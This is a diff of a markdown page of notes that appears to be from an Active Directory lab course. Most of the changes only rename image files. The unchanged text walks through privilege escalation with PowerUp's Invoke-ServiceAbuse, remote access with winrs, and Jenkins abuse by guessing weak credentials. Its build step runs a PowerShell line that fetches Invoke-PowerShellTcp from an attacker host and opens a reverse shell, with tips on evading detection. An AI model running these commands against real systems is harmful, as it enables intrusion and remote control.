@@ -17,11 +17,11 @@ For this path we'll use Powerup from PowerSploit module to check for any privile
 Invoke-AllChecks
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>This is a snip</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>This is a snip</p></figcaption></figure>
 
 We quickly see the SeviceName is AbyssWebServer:
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Explanation of the Situation
 
@@ -42,7 +42,7 @@ With this information, we can use the abuse function for Invoke-ServiceAbuse and
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student613' -Verbose
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The command exploits an unquoted service path vulnerability in the following way:
 
@@ -59,7 +59,7 @@ He's where we are in our enumeration according a guy on discord:
 
 Next, a good thing to do could be to identify a machine in the domain where the user student613 has local administrative access. For this we can use `Find-PSRemotingLocalAdminAccess.ps1`
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we see that we have Admin access on the dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user
 
@@ -69,7 +69,7 @@ set username
 set computername
 ```
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 * `winrs`: Stands for Windows Remote Shell, a command-line tool that allows you to execute commands on a remote machine.
 * `-r:dcorp-adminsrv`: Specifies the remote machine to connect to. In this case, `dcorp-adminsrv`.
@@ -89,11 +89,11 @@ Now let's try to have fun with a jenkins server without admin access. To do so, 
 
 We start by going to our Jenkins “People” page:
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p>we can see the users present on the Jenkins instance</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p>we can see the users present on the Jenkins instance</p></figcaption></figure>
 
 It's good to know that Jenkins does not have password policies, so admin:admin of felix:felix could be a valid set of credentials
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 After fooling around we manage to get an access via the builduser user, he can Configure builds and Add Build Steps which will help us in executing commands.
 
@@ -103,7 +103,7 @@ Nishang: [https://github.com/samratashok/nishang/tree/master](https://github.com
 
 We then go in the following path to create and execute a batch command ->
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 > If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse - IPAddress 172.16.100.X -Port 443 or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
 >
@@ -114,11 +114,11 @@ We then go in the following path to create and execute a batch command ->
 > powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443\
 >
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We then launch our hfs server (could work with python server, upload the invoke tcp file in the hfs directory and then build our project to trigger the script and create a reverse shell
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 powershell.exe iex (iwr http://172.16.100.13/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.13 -Port 443 
